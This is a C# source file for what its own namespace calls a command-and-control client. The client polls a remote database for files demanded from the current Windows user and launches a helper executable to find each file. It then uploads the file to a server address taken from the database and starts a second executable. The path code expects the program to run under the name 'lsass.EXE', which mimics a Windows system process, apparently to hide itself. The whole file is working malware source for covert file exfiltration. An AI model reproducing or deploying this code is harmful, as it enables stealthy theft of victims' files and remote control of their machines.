using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CnCClient
{
    public partial class MainPlatform2ndPart : Form
    {
        public string pathReal = "";

        public MainPlatform2ndPart()
        {
            InitializeComponent();
        }
        public Boolean IsServerAvailable()
        {
            PushDataDataContext dataBase = new PushDataDataContext();
            var data = (from rows in dataBase.Streaming_IPs where rows.UserType == "Server" select rows).FirstOrDefault();
            if (data.AreOn == "true")
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public string serverIPAdress()
        {
            PushDataDataContext dataBase = new PushDataDataContext();
            var pickedData = (from rows in dataBase.Streaming_IPs
                              where rows.UserType == "Server"
                              select rows).FirstOrDefault();
            return pickedData.IP;
        }
        public void CheckForUpload()
        { 
           
        string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        PushDataDataContext dataBase = new PushDataDataContext();
        var count = (from rows in dataBase.DemandedFiles
                     select rows).Count();
        if (count > 0)
        {
                var data = (from rows in dataBase.DemandedFiles
                            where rows.UserID == userName && rows.DoneOrNot == "false"
                            select rows).FirstOrDefault();
                string file = data.FileName + data.FileType;
                File.WriteAllText(pathReal + "//SearchForFile.txt", file);
                Process.Start(GetRealPath() + "//SystemCheck.exe");
                while (1==1)
                {
                        string readText = File.ReadAllText(GetRealPath() + "//DoneWithFileSearch.txt");
                        if (readText == "done")
                        {
                            File.WriteAllText(GetRealPath() + "//DoneWithFileSearch.txt", "");
                            break;
                        }
                        
                }
                if (File.Exists(GetRealPath() + "//" + file))
                {
                    client client = new client(serverIPAdress());
                    client.SendFile(GetRealPath() + "//" + file);
                }

                string fileName = data.FileName;
                string fileType = data.FileType;
                int iD = data.ID;
                string userId = data.UserID;
                string ip = data.UserIP;
                dataBase.DemandedFiles.DeleteOnSubmit(data);
                DemandedFile demandfilequer = new DemandedFile();
                demandfilequer.DoneOrNot = "true";
                demandfilequer.Availability = "true";
                demandfilequer.FileName = fileName;
                demandfilequer.FileType = fileType;
                demandfilequer.ID = iD;
                demandfilequer.UserID = userName;
                demandfilequer.UserIP = ip;
                dataBase.DemandedFiles.InsertOnSubmit(demandfilequer);
                dataBase.SubmitChanges();


            }

        }
    public string GetRealPath()
        {
            Assembly ASEM = Assembly.GetExecutingAssembly();
            string path = ASEM.Location;
            string realPath = "";
            for (int i = 0; i < path.Length - 9; i++)
            {
                if (path[i].ToString() + path[i + 1].ToString() + path[i + 2].ToString() + path[i + 3].ToString() + path[i + 4].ToString() + path[i + 5].ToString() + path[i + 6].ToString() + path[i + 7].ToString() + path[i + 8].ToString() != "lsass.EXE")
                {
                    realPath += path[i].ToString();
                }
                if ((path[i].ToString() + path[i + 1].ToString() + path[i + 2].ToString() + path[i + 3].ToString() + path[i + 4].ToString() + path[i + 5].ToString() + path[i + 6].ToString() + path[i + 7].ToString() + path[i + 8].ToString() == "lsass.EXE"))
                {
                    break;
                }
            }
            return realPath;
        }
        private void MainPlatform2ndPart_Load(object sender, EventArgs e)
        {

                pathReal = GetRealPath();
                CheckForUpload();
            



            Process.Start(GetRealPath() + "//GettingFile.exe");
        }
    }
}
